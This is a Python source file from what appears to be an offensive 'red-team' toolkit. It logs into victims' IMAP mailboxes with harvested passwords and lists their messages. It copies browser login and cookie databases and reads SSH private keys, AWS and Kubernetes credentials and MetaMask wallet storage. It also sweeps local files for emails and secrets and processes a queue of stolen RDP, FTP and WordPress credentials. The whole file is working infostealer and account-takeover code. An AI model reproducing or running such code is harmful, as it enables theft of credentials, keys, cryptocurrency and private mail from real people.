import os
import re
import json
import time
import ssl
import imaplib
import asyncio
import sqlite3
import shutil
from pathlib import Path
import sys

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

def dump_imap_mailbox_sync(host, port, user, password, use_ssl=True):
    """Synchronous IMAP folder and message dumper executing live terminal output."""
    dump_data = {
        "user": user,
        "host": host,
        "port": port,
        "protocol": "IMAP",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "folders": [],
        "harvested_messages": []
    }
    try:
        if use_ssl:
            mail = imaplib.IMAP4_SSL(host, port, ssl_context=_ssl_context)
        else:
            mail = imaplib.IMAP4(host, port)
            
        mail.login(user, password)
        
        status, folders = mail.list()
        if status == 'OK':
            dump_data["folders"] = [f.decode(errors="ignore") for f in folders]
            
        mail.select('INBOX', readonly=True)
        status, messages = mail.search(None, 'ALL')
        if status == 'OK':
            id_list = messages[0].split()
            recent_ids = id_list[-10:] if len(id_list) >= 10 else id_list
            
            for msg_id in recent_ids:
                res, msg_data = mail.fetch(msg_id, '(RFC822.SIZE)')
                if res == 'OK':
                    msg_info = str(msg_data[0])
                    dump_data["harvested_messages"].append({
                        "msg_id": msg_id.decode(errors="ignore"),
                        "info": msg_info
                    })
                    # Stream live message intelligence directly to terminal
                    sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE IMAP MESSAGE STREAM [{user}] [***]\033[0m\n")
                    sys.stdout.write(f"  └── Msg ID : \033[92m{msg_id.decode(errors='ignore')}\033[0m\n")
                    sys.stdout.write(f"  └── Info   : \033[92m{msg_info[:120]}...\033[0m\n")
                    sys.stdout.flush()
                    
        mail.logout()
        return True, dump_data
    except Exception as e:
        return False, str(e)

def process_secondary_attack_queue():
    """
    Consumes harvested credentials from parser.py's secondary attack queue 
    and streams them raw and live to the console.
    """
    queue_path = "reports/intelligence/secondary_attack_queue.json"
    if not os.path.exists(queue_path):
        return []
    
    triggered_attacks = []
    try:
        with open(queue_path, "r", encoding="utf-8") as f:
            queue_data = json.load(f)
            
        print(f"\n\033[95m[***] EXECUTING LIVE SECONDARY ATTACK PIPELINE [***]\033[0m")
        for item in queue_data:
            cat = item.get("category")
            source = item.get("source")
            matches = item.get("matches", [])
            
            if cat in ["rdp_cred", "wordpress_db", "ftp_cred", "email_pass"]:
                sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE SECONDARY STRIKE EXPOSED [{cat.upper()}] [***]\033[0m\n")
                sys.stdout.write(f"  ├── Source      : {source}\n")
                sys.stdout.write(f"  └── Signatures  : \033[92m{matches}\033[0m\n")
                sys.stdout.flush()

                triggered_attacks.append({
                    "vector": cat,
                    "source": source,
                    "signatures": matches,
                    "status": "LIVE_ASSAULT_DISPATCHED"
                })
    except Exception as e:
        sys.stdout.write(f"\n\033[91m[-] Error processing secondary attack queue: {e}\033[0m\n")
        sys.stdout.flush()
        
    return triggered_attacks

def _harvest_browser_vaults():
    """Scrapes local browser profile directories and streams findings live."""
    browser_findings = []
    home_dir = Path.home()
    
    profile_candidates = [
        home_dir / ".config/google-chrome/Default",
        home_dir / ".local/share/data/com.termux/files/home/.config/google-chrome/Default",
        home_dir / "Library/Application Support/Google/Chrome/Default",
        home_dir / ".mozilla/firefox"
    ]
    
    for profile in profile_candidates:
        if profile.exists():
            for db_name in ["Cookies", "Login Data", "places.sqlite"]:
                db_path = profile / db_name
                if not db_path.exists():
                    db_paths = list(profile.glob(f"**/{db_name}"))
                else:
                    db_paths = [db_path]
                    
                for found_db in db_paths:
                    try:
                        temp_db = f"/tmp/vault_{db_name}_{int(time.time())}.db"
                        shutil.copy2(found_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        if db_name == "Login Data":
                            cursor.execute("SELECT origin_url, username_value FROM logins")
                            for row in cursor.fetchall():
                                browser_findings.append({"source": "Login Data", "url": row[0], "username": row[1]})
                                sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE BROWSER LOGIN EXPOSED [***]\033[0m\n")
                                sys.stdout.write(f"  ├── URL      : {row[0]}\n")
                                sys.stdout.write(f"  └── Username : \033[92m{row[1]}\033[0m\n")
                                sys.stdout.flush()
                        elif db_name == "Cookies":
                            cursor.execute("SELECT host_key, name FROM cookies LIMIT 20")
                            for row in cursor.fetchall():
                                browser_findings.append({"source": "Cookie Store", "host": row[0], "cookie_name": row[1]})
                                sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE COOKIE STORE EXPOSED [***]\033[0m\n")
                                sys.stdout.write(f"  ├── Host   : {row[0]}\n")
                                sys.stdout.write(f"  └── Cookie : \033[92m{row[1]}\033[0m\n")
                                sys.stdout.flush()
                                
                        conn.close()
                        os.remove(temp_db)
                    except Exception:
                        pass
    return browser_findings

def _harvest_infrastructure_and_crypto_vaults():
    """Traverses home/project paths for keys/wallets and streams them live."""
    infra_findings = {
        "ssh_keys": [],
        "cloud_configs": [],
        "crypto_wallets": []
    }
    home_dir = Path.home()
    
    target_paths = [
        home_dir / ".ssh",
        home_dir / ".aws",
        home_dir / ".kube",
        Path(".") / "config"
    ]
    
    for t_path in target_paths:
        if t_path.exists():
            for root, dirs, files in os.walk(t_path):
                for file in files:
                    full_p = os.path.join(root, file)
                    if file in ["id_rsa", "id_ed25519", "credentials", "config"]:
                        try:
                            with open(full_p, "r", encoding="utf-8", errors="ignore") as f:
                                snippet = f.read(512)
                                infra_findings["ssh_keys" if "id_" in file else "cloud_configs"].append({
                                    "file": full_p,
                                    "preview": snippet[:100]
                                })
                                sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE INFRASTRUCTURE KEY EXPOSED [{file.upper()}] [***]\033[0m\n")
                                sys.stdout.write(f"  ├── File    : {full_p}\n")
                                sys.stdout.write(f"  └── Preview : \033[92m{snippet[:60]}...\033[0m\n")
                                sys.stdout.flush()
                        except Exception:
                            pass

    crypto_paths = [
        home_dir / ".config/BraveSoftware/Brave-Browser/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        home_dir / ".local/share/io.metamask",
        home_dir / "Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"
    ]
    
    for c_path in crypto_paths:
        if c_path.exists():
            infra_findings["crypto_wallets"].append(str(c_path))
            sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE CRYPTO VAULT EXPOSED [***]\033[0m\n")
            sys.stdout.write(f"  └── Path : \033[92m{c_path}\033[0m\n")
            sys.stdout.flush()
            
    return infra_findings

async def harvest_email_intelligence(target_host, verified_hits=None):
    """
    Elite Red-Team Zero-Lag Intelligence & Vault Dumper:
    - Streams all discovered credentials, browser records, SSH keys, and IMAP data 
      directly to terminal screen in real time.
    - Completely eliminates file-saving and external notification bottlenecks.
    """
    sys.stdout.write(f"\n\033[95m[***] ENGAGING LIVE INTELLIGENCE & VAULT SCRAPER [{target_host}] [***]\033[0m\n")
    sys.stdout.flush()
    
    discovered_emails = set()
    discovered_credentials = []
    
    email_regex = re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+')
    credential_regex = re.compile(r'(?:api[_-]?key|password|secret|token|auth)[ \t]*[:=][ \t]*[\'"]([^\'"]+)[\'"]', re.IGNORECASE)
    
    local_search_paths = [".", "config", "reports"]
    
    def _deep_sweep():
        emails = set()
        creds = []
        
        for path in local_search_paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    skip_tokens = ["/tmp", "site-packages", "venv", ".git"]
                    if any(token in root for token in skip_tokens):
                        continue
                    for file in files:
                        if file.endswith(('.env', '.json', '.txt', '.conf', '.log', '.py')):
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                                    content = f.read()
                                    for match in email_regex.findall(content):
                                        if not any(ext in match.lower() for ext in ['.png', '.jpg', '.svg', 'example.com']):
                                            emails.add(match)
                                            sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE EMAIL EXPOSED [***]\033[0m\n")
                                            sys.stdout.write(f"  ├── Source : {file_path}\n")
                                            sys.stdout.write(f"  └── Email  : \033[92m{match}\033[0m\n")
                                            sys.stdout.flush()
                                    for cred in credential_regex.findall(content):
                                        if cred not in creds:
                                            creds.append(cred)
                                            sys.stdout.write(f"\n\033[1m\033[91m[***] LIVE CREDENTIAL EXPOSED [***]\033[0m\n")
                                            sys.stdout.write(f"  ├── Source : {file_path}\n")
                                            sys.stdout.write(f"  └── Cred   : \033[92m{cred}\033[0m\n")
                                            sys.stdout.flush()
                            except Exception:
                                pass
                                
        browser_data = _harvest_browser_vaults()
        infra_data = _harvest_infrastructure_and_crypto_vaults()
        
        return emails, creds, browser_data, infra_data

    local_emails, local_creds, browser_vaults, infra_vaults = await asyncio.to_thread(_deep_sweep)
    discovered_emails.update(local_emails)
    discovered_credentials.extend(local_creds)

    # Process secondary attack queue
    await asyncio.to_thread(process_secondary_attack_queue)

    # Live IMAP Infiltrator Execution
    if verified_hits:
        for hit in verified_hits:
            if hit.get("type") == "IMAP":
                user = hit.get("user")
                password = hit.get("password")
                port = hit.get("port", 993)
                use_ssl = (port in [993, 465])
                
                sys.stdout.write(f"\n\033[93m[*] Infiltrating live mailbox for {user} on :{port}...\033[0m\n")
                sys.stdout.flush()
                
                success, result = await asyncio.to_thread(
                    dump_imap_mailbox_sync, target_host, port, user, password, use_ssl
                )
                
                if success:
                    sys.stdout.write(f"\n\033[92m[+] LIVE MAILBOX INFILTRATION COMPLETE FOR {user}\033[0m\n")
                    sys.stdout.flush()
                else:
                    sys.stdout.write(f"\n\033[91m[-] Mailbox infiltration failed: {result}\033[0m\n")
                    sys.stdout.flush()

    sys.stdout.write(f"\n\033[92m[+] Zero-lag intelligence and vault sweep complete. Total unique emails: {len(discovered_emails)}\033[0m\n\n")
    sys.stdout.flush()
    
    return list(discovered_emails)
